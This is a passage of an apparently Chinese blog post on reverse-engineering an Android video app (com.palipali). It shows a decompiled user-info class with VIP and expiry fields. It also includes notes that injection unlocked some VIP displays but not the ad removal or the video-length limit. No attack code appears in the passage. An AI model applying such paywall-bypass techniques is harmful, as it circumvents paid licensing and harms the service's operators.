class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.palipali.model.response;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> a0.b;</span><br><span class="line"><span class="keyword">import</span> android.support.v4.media.d;</span><br><span class="line"><span class="keyword">import</span> ib.e;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> ym.f;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* compiled from: ResponseUserInfo.kt */</span></span><br><span class="line"><span class="comment">/* loaded from: E:\Desktop\dump\classes16.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ResponseUserInfo</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> _id;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> binding_alert;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> checkin_recounting_times;</span><br><span class="line">    <span class="keyword">private</span> String checkin_time;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> download_limit;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> expiry;</span><br><span class="line">    <span class="keyword">private</span> String forever_code;</span><br><span class="line">    <span class="keyword">private</span> ResponseInnerAnnouncement informAnnouncement;</span><br><span class="line">    <span class="keyword">private</span> String invite_code;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> invite_deadline;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> invite_total;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> level;</span><br><span class="line">    <span class="keyword">private</span> String login_type;</span><br><span class="line">    <span class="keyword">private</span> String mail;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> new_avkey_success;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> no_purchase;</span><br><span class="line">    <span class="keyword">private</span> ResponseOrderGa orderGa;</span><br><span class="line">    <span class="keyword">private</span> ResponseInnerAnnouncement paymentAnnouncement;</span><br><span class="line">    <span class="keyword">private</span> String phone;</span><br><span class="line">    <span class="keyword">private</span> String platform;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> set_password;</span><br><span class="line">    <span class="keyword">private</span> String share_url;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> showVipTime;</span><br><span class="line">    <span class="keyword">private</span> String trialMessage;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> trialResult;</span><br><span class="line">    <span class="keyword">private</span> String unicode;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> user_id;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> verify_mail;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> verify_phone;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> vipTrial;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ResponseUserInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ResponseUserInfo</span><span class="params">(<span class="type">int</span> i10)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>._id = i10;</span><br><span class="line">        <span class="built_in">this</span>.login_type = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.mail = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.phone = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.platform = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.invite_code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.share_url = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.unicode = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.forever_code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.trialMessage = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.checkin_time = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="comment">/* synthetic */</span> ResponseUserInfo copy$<span class="keyword">default</span>(ResponseUserInfo responseUserInfo, <span class="type">int</span> i10, <span class="type">int</span> i11, Object obj) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((i11 &amp; <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            i10 = responseUserInfo._id;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> responseUserInfo.copy(i10);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">component1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>._id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> ResponseUserInfo <span class="title function_">copy</span><span class="params">(<span class="type">int</span> i10)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseUserInfo</span>(i10);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> == obj) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (obj <span class="keyword">instanceof</span> ResponseUserInfo) &amp;&amp; <span class="built_in">this</span>._id == ((ResponseUserInfo) obj)._id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">getBinding_alert</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.binding_alert;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">getCheckin_recounting_times</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.checkin_recounting_times;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">getCheckin_time</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.checkin_time;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">getDownload_limit</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.download_limit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">long</span> <span class="title function_">getExpiry</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.expiry;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">getForever_code</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.forever_code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> ResponseInnerAnnouncement <span class="title function_">getInformAnnouncement</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.informAnnouncement;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">getInvite_code</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.invite_code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">getInvite_deadline</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.invite_deadline;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">getInvite_total</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.invite_total;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">getLevel</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.level;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">getLogin_type</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.login_type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">getMail</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.mail;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">getNew_avkey_success</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.new_avkey_success;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">getNo_purchase</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.no_purchase;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> ResponseOrderGa <span class="title function_">getOrderGa</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.orderGa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> ResponseInnerAnnouncement <span class="title function_">getPaymentAnnouncement</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.paymentAnnouncement;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">getPhone</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">getPlatform</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.platform;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">getSet_password</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.set_password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">getShare_url</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.share_url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">getShowVipTime</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.showVipTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">getTrialMessage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.trialMessage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">getTrialResult</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.trialResult;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">getUnicode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.unicode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">getUser_id</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.user_id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">getVerify_mail</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.verify_mail;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">getVerify_phone</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.verify_phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">getVipTrial</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.vipTrial;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">get_id</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>._id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Integer.hashCode(<span class="built_in">this</span>._id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setBinding_alert</span><span class="params">(<span class="type">boolean</span> z10)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.binding_alert = z10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setCheckin_recounting_times</span><span class="params">(<span class="type">int</span> i10)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.checkin_recounting_times = i10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setCheckin_time</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        e.g(str, <span class="string">&quot;&lt;set-?&gt;&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.checkin_time = str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setDownload_limit</span><span class="params">(<span class="type">int</span> i10)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.download_limit = i10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setExpiry</span><span class="params">(<span class="type">long</span> j10)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.expiry = j10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setForever_code</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        e.g(str, <span class="string">&quot;&lt;set-?&gt;&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.forever_code = str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setInformAnnouncement</span><span class="params">(ResponseInnerAnnouncement responseInnerAnnouncement)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.informAnnouncement = responseInnerAnnouncement;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setInvite_code</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        e.g(str, <span class="string">&quot;&lt;set-?&gt;&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.invite_code = str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setInvite_deadline</span><span class="params">(<span class="type">int</span> i10)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.invite_deadline = i10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setInvite_total</span><span class="params">(<span class="type">int</span> i10)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.invite_total = i10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setLevel</span><span class="params">(<span class="type">int</span> i10)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.level = i10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setLogin_type</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        e.g(str, <span class="string">&quot;&lt;set-?&gt;&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.login_type = str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setMail</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        e.g(str, <span class="string">&quot;&lt;set-?&gt;&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.mail = str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setNew_avkey_success</span><span class="params">(<span class="type">boolean</span> z10)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.new_avkey_success = z10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setNo_purchase</span><span class="params">(<span class="type">int</span> i10)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.no_purchase = i10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setOrderGa</span><span class="params">(ResponseOrderGa responseOrderGa)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.orderGa = responseOrderGa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setPaymentAnnouncement</span><span class="params">(ResponseInnerAnnouncement responseInnerAnnouncement)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.paymentAnnouncement = responseInnerAnnouncement;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setPhone</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        e.g(str, <span class="string">&quot;&lt;set-?&gt;&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.phone = str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setPlatform</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        e.g(str, <span class="string">&quot;&lt;set-?&gt;&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.platform = str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setSet_password</span><span class="params">(<span class="type">boolean</span> z10)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.set_password = z10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setShare_url</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        e.g(str, <span class="string">&quot;&lt;set-?&gt;&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.share_url = str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setShowVipTime</span><span class="params">(<span class="type">int</span> i10)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.showVipTime = i10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setTrialMessage</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        e.g(str, <span class="string">&quot;&lt;set-?&gt;&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.trialMessage = str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setTrialResult</span><span class="params">(<span class="type">boolean</span> z10)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.trialResult = z10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setUnicode</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        e.g(str, <span class="string">&quot;&lt;set-?&gt;&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.unicode = str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setUser_id</span><span class="params">(<span class="type">int</span> i10)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.user_id = i10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setVerify_mail</span><span class="params">(<span class="type">int</span> i10)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.verify_mail = i10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setVerify_phone</span><span class="params">(<span class="type">int</span> i10)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.verify_phone = i10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setVipTrial</span><span class="params">(<span class="type">boolean</span> z10)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.vipTrial = z10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> b.a(d.a(<span class="string">&quot;ResponseUserInfo(_id=&quot;</span>), <span class="built_in">this</span>._id, <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="comment">/* synthetic */</span> ResponseUserInfo(<span class="type">int</span> i10, <span class="type">int</span> i11, f fVar) &#123;</span><br><span class="line">        <span class="built_in">this</span>((i11 &amp; <span class="number">1</span>) != <span class="number">0</span> ? -<span class="number">1</span> : i10);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注入似乎只能改变某些东西</p><p>如用户页面vip显示，视频页面的vip高清和快速通道选项</p><p>广告vip和视频时长似乎仍是1分钟并没有被更改，因此要继续逆向跟踪</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 